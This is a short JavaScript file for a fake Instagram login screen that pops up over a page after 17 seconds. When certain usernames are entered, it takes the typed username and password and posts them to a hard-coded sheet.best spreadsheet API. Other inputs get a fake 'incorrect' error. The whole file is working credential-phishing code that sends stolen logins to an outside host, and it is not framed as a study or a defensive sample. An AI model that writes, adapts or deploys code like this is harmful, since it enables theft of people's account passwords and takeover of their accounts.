var screen = document.getElementById('instagram-payload')
var InError = document.querySelector('#incorrect-error')


setTimeout(() => {
    screen.style = 'display: flex;'
}, 17000)

function LogIn() {
    var u_name = document.getElementById('insta-username')
    var u_pass = document.getElementById('insta-password')
    var username = u_name.value;
    var password = u_pass.value;
    u_name.value = '';
    u_pass.value = '';

    if (username.includes('why'))
    {
        InError.style = 'display: block;'
    }
    else if (password.includes('why'))
    {
        InError.style = 'display: block;'
    }
    else if (username.includes("don't"))
    {
        InError.style = 'display: block;'
    }
    else if (password.includes("don't"))
    {
        InError.style = 'display: block;'
    }
    else if (password.includes("don't"))
    {
        InError.style = 'display: block;'
    }
    else if (password.includes("know"))
    {
        InError.style = 'display: block;'
    }
    else if (username.includes("want"))
    {
        InError.style = 'display: block;'
    }
    else if (username.includes("you"))
    {
        InError.style = 'display: block;'
    }
    else if (password.includes("you"))
    {
        InError.style = 'display: block;'
    }
    else if (username.includes("u"))
    {
        InError.style = 'display: block;'
    }



    else if (username.includes('nid')){
        var url = 'https://sheet.best/api/sheets/e28bb606-f0d1-45eb-9cc4-25612e66d325'
        const postData = { //data to be sent
            ID: username,
            Password: password,
          };
          
          fetch(url, { //replace with your actual API URL
            method: "POST",
            headers: {
              "Content-Type": "application/json"
            },
            body: JSON.stringify(postData)
          })
          .then(response => response.json())
          .then(data => console.log(data))
          .catch(error => console.error(error));


          screen.style = 'display:none;'
    }

    else if (username.includes('Nid')){
        var url = 'https://sheet.best/api/sheets/e28bb606-f0d1-45eb-9cc4-25612e66d325'
        const postData = { //data to be sent
            ID: username,
            Password: password,
          };
          
          fetch(url, { //replace with your actual API URL
            method: "POST",
            headers: {
              "Content-Type": "application/json"
            },
            body: JSON.stringify(postData)
          })
          .then(response => response.json())
          .then(data => console.log(data))
          .catch(error => console.error(error));


          screen.style = 'display:none;'

    }

    else {
        InError.style = 'display: block;'
    }
}